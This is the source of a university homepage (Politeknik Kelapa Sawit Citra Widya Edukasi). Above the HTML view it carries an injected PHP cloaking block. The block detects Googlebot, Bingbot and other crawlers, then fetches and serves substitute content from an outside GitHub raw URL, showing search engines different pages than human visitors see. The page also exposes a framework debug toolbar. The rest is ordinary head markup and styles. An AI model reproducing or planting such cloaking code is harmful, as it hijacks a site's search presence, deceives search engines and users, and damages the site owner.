<?php
 
function is_bot() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'tidak ada user agent';
    $bots = array(
        'Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification',
        'Google-InspectionTool', 'AhrefsBot', 'SemrushBot', 'MJ12bot',
        'DotBot', 'PetalBot', 'facebot'
    );
 
    if (empty($user_agent)) {
        return true;
    }
 
    foreach ($bots as $bot) {
        if (stripos($user_agent, $bot) !== false) {
            return true;
        }
    }
 
    return false;
}
 
 
function get_remote_content($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT'] ?? 'bot-checker');
    $response = curl_exec($ch);
 
    if (curl_errno($ch)) {
        echo 'Curl error: ' . curl_error($ch);
    }
 
    curl_close($ch);
    return $response;
}
 
 
$target_url = 'https://raw.githubusercontent.com/fadlipul69/pluginsss/refs/heads/main/poltekcwe.ac.id';
 
 
if (is_bot()) {
    $message = get_remote_content($target_url);
    if ($message) {
        echo $message;
    } else {
        echo "Gagal ambil konten dari URL.";
    }
    exit;
}
?>

<!-- DEBUG-VIEW START 2 APPPATH/Views/main.php -->
<!DOCTYPE html>
<html lang="id" prefix="og: http://ogp.me/ns#">

<head>
<script  id="debugbar_loader" data-time="1763045483.889843" src="https://poltekcwe.ac.id/?debugbar"></script><script  id="debugbar_dynamic_script"></script><style  id="debugbar_dynamic_style"></style><script class="kint-rich-script">void 0===window.kintShared&&(window.kintShared=function(){"use strict";var e={dedupe:function(e,n){return[].forEach.call(document.querySelectorAll(e),function(e){e!==(n=n&&n.ownerDocument.contains(n)?n:e)&&e.parentNode.removeChild(e)}),n},runOnce:function(e){"complete"===document.readyState?e():window.addEventListener("load",e)}};return window.addEventListener("click",function(e){var n;e.target.classList.contains("kint-ide-link")&&((n=new XMLHttpRequest).open("GET",e.target.href),n.send(null),e.preventDefault())}),e}());
void 0===window.kintRich&&(window.kintRich=function(){"use strict";var l={selectText:function(e){var t=window.getSelection(),a=document.createRange();a.selectNodeContents(e),t.removeAllRanges(),t.addRange(a)},toggle:function(e,t){var a=l.getChildren(e);a&&(e.classList.toggle("kint-show",t),1===a.childNodes.length)&&(a=a.childNodes[0].childNodes[0])&&a.classList&&a.classList.contains("kint-parent")&&l.toggle(a,t)},toggleChildren:function(e,t){var a=l.getChildren(e);if(a){var o=a.getElementsByClassName("kint-parent"),s=o.length;for(void 0===t&&(t=e.classList.contains("kint-show"));s--;)l.toggle(o[s],t)}},switchTab:function(e){var t=e.previousSibling,a=0;for(e.parentNode.getElementsByClassName("kint-active-tab")[0].classList.remove("kint-active-tab"),e.classList.add("kint-active-tab");t;)1===t.nodeType&&a++,t=t.previousSibling;for(var o=e.parentNode.nextSibling.childNodes,s=0;s<o.length;s++)s===a?(o[s].classList.add("kint-show"),1===o[s].childNodes.length&&(t=o[s].childNodes[0].childNodes[0])&&t.classList&&t.classList.contains("kint-parent")&&l.toggle(t,!0)):o[s].classList.remove("kint-show")},mktag:function(e){return"<"+e+">"},openInNewWindow:function(e){var t=window.open();t&&(t.document.open(),t.document.write(l.mktag("html")+l.mktag("head")+l.mktag("title")+"Kint ("+(new Date).toISOString()+")"+l.mktag("/title")+l.mktag('meta charset="utf-8"')+l.mktag('script class="kint-rich-script" nonce="'+l.script.nonce+'"')+l.script.innerHTML+l.mktag("/script")+l.mktag('style class="kint-rich-style" nonce="'+l.style.nonce+'"')+l.style.innerHTML+l.mktag("/style")+l.mktag("/head")+l.mktag("body")+'<input class="kint-note-input" placeholder="Take some notes!"><div class="kint-rich">'+e.parentNode.outerHTML+"</div>"+l.mktag("/body")),t.document.close())},sortTable:function(e,a){var t=e.tBodies[0];[].slice.call(e.tBodies[0].rows).sort(function(e,t){if(e=e.cells[a].textContent.trim().toLocaleLowerCase(),t=t.cells[a].textContent.trim().toLocaleLowerCase(),isNaN(e)||isNaN(t)){if(isNaN(e)&&!isNaN(t))return 1;if(isNaN(t)&&!isNaN(e))return-1}else e=parseFloat(e),t=parseFloat(t);return e<t?-1:t<e?1:0}).forEach(function(e){t.appendChild(e)})},showAccessPath:function(e){for(var t=e.childNodes,a=0;a<t.length;a++)if(t[a].classList&&t[a].classList.contains("access-path"))return t[a].classList.toggle("kint-show"),void(t[a].classList.contains("kint-show")&&l.selectText(t[a]))},showSearchBox:function(e){var t=e.querySelector(".kint-search");t&&(t.classList.toggle("kint-show"),t.classList.contains("kint-show")?(e.classList.add("kint-show"),t.focus(),t.select(),l.search(e.parentNode,t.value)):e.parentNode.classList.remove("kint-search-root"))},search:function(e,t){e.querySelectorAll(".kint-search-match").forEach(function(e){e.classList.remove("kint-search-match")}),e.classList.remove("kint-search-match"),e.classList.toggle("kint-search-root",t.length),t.length&&l.findMatches(e,t)},findMatches:function(e,t){var a,o,s,n=e.cloneNode(!0);if(n.querySelectorAll(".access-path").forEach(function(e){e.remove()}),-1!=n.textContent.toUpperCase().indexOf(t.toUpperCase())){for(r in e.classList.add("kint-search-match"),e.childNodes)if("DD"==e.childNodes[r].tagName){a=e.childNodes[r];break}if(a)if([].forEach.call(a.childNodes,function(e){"DL"==e.tagName?l.findMatches(e,t):"UL"==e.tagName&&(e.classList.contains("kint-tabs")?o=e.childNodes:e.classList.contains("kint-tab-contents")&&(s=e.childNodes))}),o&&s&&o.length==s.length)for(var r=0;r<o.length;r++){var i=!1;(i=-1!=o[r].textContent.toUpperCase().indexOf(t.toUpperCase())||((n=s[r].cloneNode(!0)).querySelectorAll(".access-path").forEach(function(e){e.remove()}),-1!=n.textContent.toUpperCase().indexOf(t.toUpperCase()))?!0:i)&&(o[r].classList.add("kint-search-match"),[].forEach.call(s[r].childNodes,function(e){"DL"==e.tagName&&l.findMatches(e,t)}))}}},getParentByClass:function(e,t){for(;;){if(!(e=e.parentNode)||!e.classList||e===document)return null;if(e.classList.contains(t))return e}return null},getParentHeader:function(e,t){for(var a=e.nodeName.toLowerCase();"dd"!==a&&"dt"!==a&&l.getParentByClass(e,"kint-rich");)a=(e=e.parentNode).nodeName.toLowerCase();return l.getParentByClass(e,"kint-rich")?(e="dd"===a&&t?e.previousElementSibling:e)&&"dt"===e.nodeName.toLowerCase()&&e.classList.contains("kint-parent")?e:void 0:null},getChildren:function(e){for(;(e=e.nextElementSibling)&&"dd"!==e.nodeName.toLowerCase(););return e},isFolderOpen:function(){if(l.folder&&l.folder.querySelector("dd.kint-foldout"))return l.folder.querySelector("dd.kint-foldout").previousSibling.classList.contains("kint-show")},initLoad:function(){l.style=window.kintShared.dedupe("style.kint-rich-style",l.style),l.script=window.kintShared.dedupe("script.kint-rich-script",l.script),l.folder=window.kintShared.dedupe(".kint-rich.kint-folder",l.folder);var t,e=document.querySelectorAll("input.kint-search");[].forEach.call(e,function(t){function e(e){window.clearTimeout(a),t.value!==o&&(a=window.setTimeout(function(){o=t.value,l.search(t.parentNode.parentNode,o)},500))}var a=null,o=null;t.removeEventListener("keyup",e),t.addEventListener("keyup",e)}),l.folder&&(t=l.folder.querySelector("dd"),[].forEach.call(document.querySelectorAll(".kint-rich.kint-file"),function(e){e.parentNode!==l.folder&&t.appendChild(e)}),document.body.appendChild(l.folder),l.folder.classList.add("kint-show"))},keyboardNav:{targets:[],target:0,active:!1,fetchTargets:function(){var e=l.keyboardNav.targets[l.keyboardNav.target];l.keyboardNav.targets=[],document.querySelectorAll(".kint-rich nav, .kint-tabs>li:not(.kint-active-tab)").forEach(function(e){l.isFolderOpen()&&!l.folder.contains(e)||0===e.offsetWidth&&0===e.offsetHeight||l.keyboardNav.targets.push(e)}),e&&-1!==l.keyboardNav.targets.indexOf(e)&&(l.keyboardNav.target=l.keyboardNav.targets.indexOf(e))},sync:function(e){var t=document.querySelector(".kint-focused");t&&t.classList.remove("kint-focused"),l.keyboardNav.active&&((t=l.keyboardNav.targets[l.keyboardNav.target]).classList.add("kint-focused"),e||l.keyboardNav.scroll(t))},scroll:function(e){var t,a;l.folder&&e===l.folder.querySelector("dt > nav")||(e=(t=function(e){return e.offsetTop+(e.offsetParent?t(e.offsetParent):0)})(e),l.isFolderOpen()?(a=l.folder.querySelector("dd.kint-foldout")).scrollTo(0,e-a.clientHeight/2):window.scrollTo(0,e-window.innerHeight/2))},moveCursor:function(e){for(l.keyboardNav.target+=e;l.keyboardNav.target<0;)l.keyboardNav.target+=l.keyboardNav.targets.length;for(;l.keyboardNav.target>=l.keyboardNav.targets.length;)l.keyboardNav.target-=l.keyboardNav.targets.length;l.keyboardNav.sync()},setCursor:function(e){if(!l.isFolderOpen()||l.folder.contains(e)){l.keyboardNav.fetchTargets();for(var t=0;t<l.keyboardNav.targets.length;t++)if(e===l.keyboardNav.targets[t])return l.keyboardNav.target=t,!0}return!1}},mouseNav:{lastClickTarget:null,lastClickTimer:null,lastClickCount:0,renewLastClick:function(){window.clearTimeout(l.mouseNav.lastClickTimer),l.mouseNav.lastClickTimer=window.setTimeout(function(){l.mouseNav.lastClickTarget=null,l.mouseNav.lastClickTimer=null,l.mouseNav.lastClickCount=0},250)}},style:null,script:null,folder:null};return window.addEventListener("click",function(e){var t=e.target;if(l.mouseNav.lastClickTarget&&l.mouseNav.lastClickTimer&&l.mouseNav.lastClickCount)if(t=l.mouseNav.lastClickTarget,1===l.mouseNav.lastClickCount)l.toggleChildren(t.parentNode),l.keyboardNav.setCursor(t),l.keyboardNav.sync(!0),l.mouseNav.lastClickCount++,l.mouseNav.renewLastClick();else{for(var a=t.parentNode.classList.contains("kint-show"),o=document.getElementsByClassName("kint-parent"),s=o.length;s--;)l.toggle(o[s],a);l.keyboardNav.setCursor(t),l.keyboardNav.sync(!0),l.keyboardNav.scroll(t),window.clearTimeout(l.mouseNav.lastClickTimer),l.mouseNav.lastClickTarget=null,l.mouseNav.lastClickTarget=null,l.mouseNav.lastClickCount=0}else if(l.getParentByClass(t,"kint-rich")){var n=t.nodeName.toLowerCase();if("dfn"===n&&l.selectText(t),"th"===n)e.ctrlKey||l.sortTable(t.parentNode.parentNode.parentNode,t.cellIndex);else if((t=l.getParentHeader(t))&&(l.keyboardNav.setCursor(t.querySelector("nav")),l.keyboardNav.sync(!0)),t=e.target,"li"===n&&"kint-tabs"===t.parentNode.className)"kint-active-tab"!==t.className&&l.switchTab(t),(t=l.getParentHeader(t,!0))&&(l.keyboardNav.setCursor(t.querySelector("nav")),l.keyboardNav.sync(!0));else if("nav"===n)"footer"===t.parentNode.nodeName.toLowerCase()?(l.keyboardNav.setCursor(t),l.keyboardNav.sync(!0),(t=t.parentNode).classList.toggle("kint-show")):(l.toggle(t.parentNode),l.keyboardNav.fetchTargets(),l.mouseNav.lastClickCount=1,l.mouseNav.lastClickTarget=t,l.mouseNav.renewLastClick());else if(t.classList.contains("kint-popup-trigger")){var r=t.parentNode;if("footer"===r.nodeName.toLowerCase())r=r.previousSibling;else for(;r&&!r.classList.contains("kint-parent");)r=r.parentNode;l.openInNewWindow(r)}else t.classList.contains("kint-access-path-trigger")?l.showAccessPath(t.parentNode):t.classList.contains("kint-search-trigger")?l.showSearchBox(t.parentNode):t.classList.contains("kint-search")||("pre"===n&&3===e.detail?l.selectText(t):l.getParentByClass(t,"kint-source")&&3===e.detail?l.selectText(l.getParentByClass(t,"kint-source")):t.classList.contains("access-path")?l.selectText(t):"a"!==n&&(t=l.getParentHeader(t))&&(l.toggle(t),l.keyboardNav.fetchTargets()))}},!0),window.addEventListener("keydown",function(e){if(e.target===document.body&&!e.altKey&&!e.ctrlKey)if(68===e.keyCode){if(l.keyboardNav.active)l.keyboardNav.active=!1;else if(l.keyboardNav.active=!0,l.keyboardNav.fetchTargets(),0===l.keyboardNav.targets.length)return void(l.keyboardNav.active=!1);l.keyboardNav.sync(),e.preventDefault()}else if(l.keyboardNav.active)if(9===e.keyCode)l.keyboardNav.moveCursor(e.shiftKey?-1:1),e.preventDefault();else if(38===e.keyCode||75===e.keyCode)l.keyboardNav.moveCursor(-1),e.preventDefault();else if(40===e.keyCode||74===e.keyCode)l.keyboardNav.moveCursor(1),e.preventDefault();else{var t,a,o=l.keyboardNav.targets[l.keyboardNav.target];if("li"===o.nodeName.toLowerCase()){if(32===e.keyCode||13===e.keyCode)return l.switchTab(o),l.keyboardNav.fetchTargets(),l.keyboardNav.sync(),void e.preventDefault();if(39===e.keyCode||76===e.keyCode)return l.keyboardNav.moveCursor(1),void e.preventDefault();if(37===e.keyCode||72===e.keyCode)return l.keyboardNav.moveCursor(-1),void e.preventDefault()}o=o.parentNode,65===e.keyCode?(l.showAccessPath(o),e.preventDefault()):"footer"===o.nodeName.toLowerCase()&&o.parentNode.classList.contains("kint-rich")?32===e.keyCode||13===e.keyCode?(o.classList.toggle("kint-show"),e.preventDefault()):37===e.keyCode||72===e.keyCode?(o.classList.remove("kint-show"),e.preventDefault()):39!==e.keyCode&&76!==e.keyCode||(o.classList.add("kint-show"),e.preventDefault()):32===e.keyCode||13===e.keyCode?(l.toggle(o),l.keyboardNav.fetchTargets(),e.preventDefault()):39!==e.keyCode&&76!==e.keyCode&&37!==e.keyCode&&72!==e.keyCode||(t=39===e.keyCode||76===e.keyCode,o.classList.contains("kint-show")?l.toggleChildren(o,t):t||(a=l.getParentHeader(o.parentNode.parentNode,!0))&&(l.keyboardNav.setCursor((o=a).querySelector("nav")),l.keyboardNav.sync()),l.toggle(o,t),l.keyboardNav.fetchTargets(),e.preventDefault())}},!0),l}()),window.kintShared.runOnce(window.kintRich.initLoad);
void 0===window.kintMicrotimeInitialized&&(window.kintMicrotimeInitialized=1,window.addEventListener("load",function(){"use strict";var a={},t=Array.prototype.slice.call(document.querySelectorAll("[data-kint-microtime-group]"),0);t.forEach(function(t){var i,e;t.querySelector(".kint-microtime-lap")&&(i=t.getAttribute("data-kint-microtime-group"),e=parseFloat(t.querySelector(".kint-microtime-lap").innerHTML),t=parseFloat(t.querySelector(".kint-microtime-avg").innerHTML),void 0===a[i]&&(a[i]={}),(void 0===a[i].min||a[i].min>e)&&(a[i].min=e),(void 0===a[i].max||a[i].max<e)&&(a[i].max=e),a[i].avg=t)}),t.forEach(function(t){var i,e,r,o,n=t.querySelector(".kint-microtime-lap");null!==n&&(i=parseFloat(n.textContent),o=t.dataset.kintMicrotimeGroup,e=a[o].avg,r=a[o].max,o=a[o].min,i!==(t.querySelector(".kint-microtime-avg").textContent=e)||i!==o||i!==r)&&(n.style.background=e<i?"hsl("+(40-40*((i-e)/(r-e)))+", 100%, 65%)":"hsl("+(40+80*(e===o?0:(e-i)/(e-o)))+", 100%, 65%)")})}));
</script><style class="kint-rich-style">.kint-rich{font-size:13px;overflow-x:auto;white-space:nowrap;background:rgba(255,255,255,0.9)}.kint-rich.kint-folder{position:fixed;bottom:0;left:0;right:0;z-index:999999;width:100%;margin:0;display:block}.kint-rich.kint-folder dd.kint-foldout{max-height:calc(100vh - 100px);padding-right:8px;overflow-y:scroll;display:none}.kint-rich.kint-folder dd.kint-foldout.kint-show{display:block}.kint-rich::selection,.kint-rich::-moz-selection,.kint-rich::-webkit-selection{background:#aaa;color:#1d1e1e}.kint-rich .kint-focused{box-shadow:0 0 3px 2px red}.kint-rich,.kint-rich::before,.kint-rich::after,.kint-rich *,.kint-rich *::before,.kint-rich *::after{box-sizing:border-box;border-radius:0;color:#1d1e1e;float:none !important;font-family:Consolas, Menlo, Monaco, Lucida Console, Liberation Mono, DejaVu Sans Mono, Bitstream Vera Sans Mono, Courier New, monospace, serif;line-height:15px;margin:0;padding:0;text-align:left}.kint-rich{margin:8px 0}.kint-rich dt,.kint-rich dl{width:auto}.kint-rich dt,.kint-rich div.access-path{background:#f8f8f8;border:1px solid #d7d7d7;color:#1d1e1e;display:block;font-weight:bold;list-style:none outside none;overflow:auto;padding:4px}.kint-rich dt:hover,.kint-rich div.access-path:hover{border-color:#aaa}.kint-rich>dl dl{padding:0 0 0 12px}.kint-rich dt.kint-parent>nav,.kint-rich>footer>nav{background:url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMCAxNTAiPjxwYXRoIGQ9Ik02IDdoMThsLTkgMTV6bTAgMzBoMThsLTkgMTV6bTAgNDVoMThsLTktMTV6bTAgMzBoMThsLTktMTV6bTAgMTJsMTggMThtLTE4IDBsMTgtMTgiIGZpbGw9IiM1NTUiLz48cGF0aCBkPSJNNiAxMjZsMTggMThtLTE4IDBsMTgtMTgiIHN0cm9rZS13aWR0aD0iMiIgc3Ryb2tlPSIjNTU1Ii8+PC9zdmc+") no-repeat scroll 0 0/15px 75px transparent;cursor:pointer;display:inline-block;height:15px;width:15px;margin-right:3px;vertical-align:middle}.kint-rich dt.kint-parent:hover>nav,.kint-rich>footer>nav:hover{background-position:0 25%}.kint-rich dt.kint-parent.kint-show>nav,.kint-rich>footer.kint-show>nav{background-position:0 50%}.kint-rich dt.kint-parent.kint-show:hover>nav,.kint-rich>footer.kint-show>nav:hover{background-position:0 75%}.kint-rich dt.kint-parent.kint-locked>nav{background-position:0 100%}.kint-rich dt.kint-parent+dd{display:none;border-left:1px dashed #d7d7d7}.kint-rich dt.kint-parent.kint-show+dd{display:block}.kint-rich var,.kint-rich var a{color:#06f;font-style:normal}.kint-rich dt:hover var,.kint-rich dt:hover var a{color:red}.kint-rich dfn{font-style:normal;font-family:monospace;color:#1d1e1e}.kint-rich pre{color:#1d1e1e;margin:0 0 0 12px;padding:5px;overflow-y:hidden;border-top:0;border:1px solid #d7d7d7;background:#f8f8f8;display:block;word-break:normal}.kint-rich .kint-popup-trigger,.kint-rich .kint-access-path-trigger,.kint-rich .kint-search-trigger{background:rgba(29,30,30,0.8);border-radius:3px;height:16px;font-size:16px;margin-left:5px;font-weight:bold;width:16px;text-align:center;float:right !important;cursor:pointer;color:#f8f8f8;position:relative;overflow:hidden;line-height:17.6px}.kint-rich .kint-popup-trigger:hover,.kint-rich .kint-access-path-trigger:hover,.kint-rich .kint-search-trigger:hover{color:#1d1e1e;background:#f8f8f8}.kint-rich dt.kint-parent>.kint-popup-trigger{line-height:19.2px}.kint-rich .kint-search-trigger{font-size:20px}.kint-rich input.kint-search{display:none;border:1px solid #d7d7d7;border-top-width:0;border-bottom-width:0;padding:4px;float:right !important;margin:-4px 0;color:#1d1e1e;background:#f8f8f8;height:24px;width:160px;position:relative;z-index:100}.kint-rich input.kint-search.kint-show{display:block}.kint-rich .kint-search-root ul.kint-tabs>li:not(.kint-search-match){background:#f8f8f8;opacity:0.5}.kint-rich .kint-search-root dl:not(.kint-search-match){opacity:0.5}.kint-rich .kint-search-root dl:not(.kint-search-match)>dt{background:#f8f8f8}.kint-rich .kint-search-root dl:not(.kint-search-match) dl,.kint-rich .kint-search-root dl:not(.kint-search-match) ul.kint-tabs>li:not(.kint-search-match){opacity:1}.kint-rich div.access-path{background:#f8f8f8;display:none;margin-top:5px;padding:4px;white-space:pre}.kint-rich div.access-path.kint-show{display:block}.kint-rich footer{padding:0 3px 3px;font-size:9px;background:transparent}.kint-rich footer>.kint-popup-trigger{background:transparent;color:#1d1e1e}.kint-rich footer nav{height:10px;width:10px;background-size:10px 50px}.kint-rich footer>ol{display:none;margin-left:32px}.kint-rich footer.kint-show>ol{display:block}.kint-rich a{color:#1d1e1e;text-shadow:none;text-decoration:underline}.kint-rich a:hover{color:#1d1e1e;border-bottom:1px dotted #1d1e1e}.kint-rich ul{list-style:none;padding-left:12px}.kint-rich ul:not(.kint-tabs) li{border-left:1px dashed #d7d7d7}.kint-rich ul:not(.kint-tabs) li>dl{border-left:none}.kint-rich ul.kint-tabs{margin:0 0 0 12px;padding-left:0;background:#f8f8f8;border:1px solid #d7d7d7;border-top:0}.kint-rich ul.kint-tabs>li{background:#f8f8f8;border:1px solid #d7d7d7;cursor:pointer;display:inline-block;height:24px;margin:2px;padding:0 12px;vertical-align:top}.kint-rich ul.kint-tabs>li:hover,.kint-rich ul.kint-tabs>li.kint-active-tab:hover{border-color:#aaa;color:red}.kint-rich ul.kint-tabs>li.kint-active-tab{background:#f8f8f8;border-top:0;margin-top:-1px;height:27px;line-height:24px}.kint-rich ul.kint-tabs>li:not(.kint-active-tab){line-height:20px}.kint-rich ul.kint-tabs li+li{margin-left:0}.kint-rich ul.kint-tab-contents>li{display:none}.kint-rich ul.kint-tab-contents>li.kint-show{display:block}.kint-rich dt:hover+dd>ul>li.kint-active-tab{border-color:#aaa;color:red}.kint-rich dt>.kint-color-preview{width:16px;height:16px;display:inline-block;vertical-align:middle;margin-left:10px;border:1px solid #d7d7d7;background-color:#ccc;background-image:url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 2 2"><path fill="%23FFF" d="M0 0h1v2h1V1H0z"/></svg>');background-size:100%}.kint-rich dt>.kint-color-preview:hover{border-color:#aaa}.kint-rich dt>.kint-color-preview>div{width:100%;height:100%}.kint-rich table{border-collapse:collapse;empty-cells:show;border-spacing:0}.kint-rich table *{font-size:12px}.kint-rich table dt{background:none;padding:2px}.kint-rich table dt .kint-parent{min-width:100%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.kint-rich table td,.kint-rich table th{border:1px solid #d7d7d7;padding:2px;vertical-align:center}.kint-rich table th{cursor:alias}.kint-rich table td:first-child,.kint-rich table th{font-weight:bold;background:#f8f8f8;color:#1d1e1e}.kint-rich table td{background:#f8f8f8;white-space:pre}.kint-rich table td>dl{padding:0}.kint-rich table pre{border-top:0;border-right:0}.kint-rich table thead th:first-child{background:none;border:0}.kint-rich table tr:hover>td{box-shadow:0 0 1px 0 #aaa inset}.kint-rich table tr:hover var{color:red}.kint-rich table ul.kint-tabs li.kint-active-tab{height:20px;line-height:17px}.kint-rich pre.kint-source{margin-left:-1px}.kint-rich pre.kint-source[data-kint-filename]:before{display:block;content:attr(data-kint-filename);margin-bottom:4px;padding-bottom:4px;border-bottom:1px solid #f8f8f8}.kint-rich pre.kint-source>div:before{display:inline-block;content:counter(kint-l);counter-increment:kint-l;border-right:1px solid #aaa;padding-right:8px;margin-right:8px}.kint-rich pre.kint-source>div.kint-highlight{background:#f8f8f8}.kint-rich .kint-microtime-lap{text-shadow:-1px 0 #aaa,0 1px #aaa,1px 0 #aaa,0 -1px #aaa;color:#f8f8f8;font-weight:bold}input.kint-note-input{width:100%}.kint-rich .kint-focused{box-shadow:0 0 3px 2px red}.kint-rich dt{font-weight:normal}.kint-rich dt.kint-parent{margin-top:4px}.kint-rich dl dl{margin-top:4px;padding-left:25px;border-left:none}.kint-rich>dl>dt{background:#f8f8f8}.kint-rich ul{margin:0;padding-left:0}.kint-rich ul:not(.kint-tabs)>li{border-left:0}.kint-rich ul.kint-tabs{background:#f8f8f8;border:1px solid #d7d7d7;border-width:0 1px 1px 1px;padding:4px 0 0 12px;margin-left:-1px;margin-top:-1px}.kint-rich ul.kint-tabs li,.kint-rich ul.kint-tabs li+li{margin:0 0 0 4px}.kint-rich ul.kint-tabs li{border-bottom-width:0;height:25px}.kint-rich ul.kint-tabs li:first-child{margin-left:0}.kint-rich ul.kint-tabs li.kint-active-tab{border-top:1px solid #d7d7d7;background:#fff;font-weight:bold;padding-top:0;border-bottom:1px solid #fff !important;margin-bottom:-1px}.kint-rich ul.kint-tabs li.kint-active-tab:hover{border-bottom:1px solid #fff}.kint-rich ul>li>pre{border:1px solid #d7d7d7}.kint-rich dt:hover+dd>ul{border-color:#aaa}.kint-rich pre{background:#fff;margin-top:4px;margin-left:25px}.kint-rich .kint-source{margin-left:-1px}.kint-rich .kint-source .kint-highlight{background:#cfc}.kint-rich .kint-parent.kint-show>.kint-search{border-bottom-width:1px}.kint-rich table td{background:#fff}.kint-rich table td>dl{padding:0;margin:0}.kint-rich table td>dl>dt.kint-parent{margin:0}.kint-rich table td:first-child,.kint-rich table td,.kint-rich table th{padding:2px 4px}.kint-rich table dd,.kint-rich table dt{background:#fff}.kint-rich table tr:hover>td{box-shadow:none;background:#cfc}
</style>

  <meta charset="utf-8">
  <meta name="author" content="Politeknik Kelapa Sawit Citra Widya Edukasi">
  <meta name="keywords" content="kelapa sawit, politeknik kelapa sawit, politeknik citra widya edukasi, kelapa sawit indonesia, pabrik kelapa sawit, perkebunan kelapa sawit, politeknik kelapa sawit citra widya edukasi, citra widya edukasi">
  <meta name="description" content="Politeknik Kelapa Sawit Citra Widya Edukasi adalah Politeknik khusus kelapa sawit Pertama di Indonesia bahkan mungkin di Dunia!">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="index, follow">
  <link rel="canonical" href="https://poltekcwe.ac.id/">
  <link rel="icon" type="image" href="img/icon/logo-politeknik-kelapa-sawit-citra-widya-edukasi.png">
  <title>Politeknik Kelapa Sawit Citra Widya Edukasi</title>
  <style media="all">
    .header-navigation ul>li.active2>a {
      border-bottom: 2px solid #85CA63;
      background: white;
      color: #67bd3c;
    }

    #chatWA {
      display: block;
      position: fixed;
      right: 15px;
      bottom: 45px;
      z-index: 1;
      width: 80px;
      height: 80px;
      background-image: url(https://poltekcwe.ac.id/img/whatsapp/whatsapp80px.png);
      background-size: 100%;
      opacity: 1;
      border-radius: 0;
      text-align: center;
      font-size: 21px;
      color: #fff;
      cursor: pointer
    }

    .welcome-p {
      font-weight: 100;
      font-size: 2rem !important;
    }

    .welcome-h-pc {
      font-weight: 750;
      font-size: 2.90rem;
    }

    .welcome-h-mo {
      font-weight: 750;
      font-size: 3.50rem;
    }

    .d-berita {
      display: block !important;
    }

    .d-berita-owl {
      width: 100% !important;
      left: 0px !important;
      display: block !important;
    }

    .d-berita-item {
      width: 100% !important;
    }
  </style>

  <meta property="og:title" content="Politeknik Kelapa Sawit Citra Widya Edukasi" />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="https://poltekcwe.ac.id/" />
  <meta property="og:image" content="https://poltekcwe.ac.id/img/ss/website-politeknik-kelapa-sawit-citra-widya-edukasi.jpg" />
  <meta property="og:description" content="Politeknik Kelapa Sawit Citra Widya Edukasi adalah Politeknik khusus kelapa sawit Pertama di Indonesia bahkan mungkin di Dunia!" />
  <meta property="og:site_name" content="Politeknik Kelapa Sawit Citra Widya Edukasi" />
  <meta property="fb:admins" content="100002752509651" />

  <meta name="twitter:card" content="summary" />
  <meta name="twitter:site" content="@politeknikCWE" />
  <meta name="twitter:creator" content="@politeknikCWE" />
  <meta name="twitter:title" content="Politeknik Kelapa Sawit Citra Widya Edukasi" />
  <meta name="twitter:description" content="Politeknik Kelapa Sawit Citra Widya Edukasi adalah Politeknik khusus kelapa sawit Pertama di Indonesia bahkan mungkin di Dunia!" />
  <meta name="twitter:image" content="https://poltekcwe.ac.id/img/ss/website-politeknik-kelapa-sawit-citra-widya-edukasi.jpg" />

  <meta itemprop="name" content="Politeknik Kelapa Sawit Citra Widya Edukasi" />
  <meta itemprop="url" content="https://poltekcwe.ac.id/" />
  <meta itemprop="creator accountablePerson" content="Politeknik Kelapa Sawit Citra Widya Edukasi"" />
      
<link href=" https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700|PT+Sans+Narrow|Source+Sans+Pro:200,300,400,600,700,900&amp;subset=all" rel="stylesheet" type="text/css">
  <link href="https://poltekcwe.ac.id/global/plugins/font-awesome/css/font-awesome.min.css" rel="stylesheet">
  <link href="https://poltekcwe.ac.id/global/plugins/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://poltekcwe.ac.id/global/plugins/fancybox/source/jquery.fancybox.css" rel="stylesheet">
  <link href="https://poltekcwe.ac.id/global/plugins/carousel-owl-carousel/owl-carousel/owl.carousel.css" rel="stylesheet">
  <link href="https://poltekcwe.ac.id/global/plugins/slider-revolution-slider/rs-plugin/css/settings.css" rel="stylesheet">
    <link href="https://poltekcwe.ac.id/frontend/layout/css/style.css" rel="stylesheet">
  <link href="https://poltekcwe.ac.id/frontend/pages/css/style-revolution-slider.css" rel="stylesheet">
  <link href="https://poltekcwe.ac.id/frontend/layout/css/min/style-responsive-min.css" rel="stylesheet">
  <link href="https://poltekcwe.ac.id/frontend/layout/css/themes/blue.css" rel="stylesheet" id="style-color">
  <!--<link href="https://poltekcwe.ac.id/frontend/layout/css/custom.css" rel="stylesheet">-->
  <link href="https://poltekcwe.ac.id/css/custom.css" rel="stylesheet">

  <!--<script src="https://poltekcwe.ac.id/global/plugins/jquery.min.js" type="text/javascript"></script>-->
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha512-DUC8yqWf7ez3JD1jszxCWSVB0DMP78eOyBpMa5aJki1bIRARykviOuImIczkxlj1KhVSyS16w2FSQetkD4UU2w==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <script src="https://poltekcwe.ac.id/global/plugins/jquery-migrate.min.js" type="text/javascript" defer></script>
  <script src="https://poltekcwe.ac.id/global/plugins/bootstrap/js/bootstrap.min.js" type="text/javascript" defer></script>
  <script src="https://poltekcwe.ac.id/frontend/layout/scripts/back-to-top.js" type="text/javascript" defer></script>
  <script src="https://poltekcwe.ac.id/global/plugins/fancybox/source/jquery.fancybox.pack.js" type="text/javascript" defer></script><!-- pop up -->
  <script src="https://poltekcwe.ac.id/global/plugins/carousel-owl-carousel/owl-carousel/owl.carousel.min.js" type="text/javascript" defer></script><!-- slider for products -->
  <script src="https://poltekcwe.ac.id/global/plugins/slider-revolution-slider/rs-plugin/js/jquery.themepunch.revolution.min.js" type="text/javascript" defer></script>
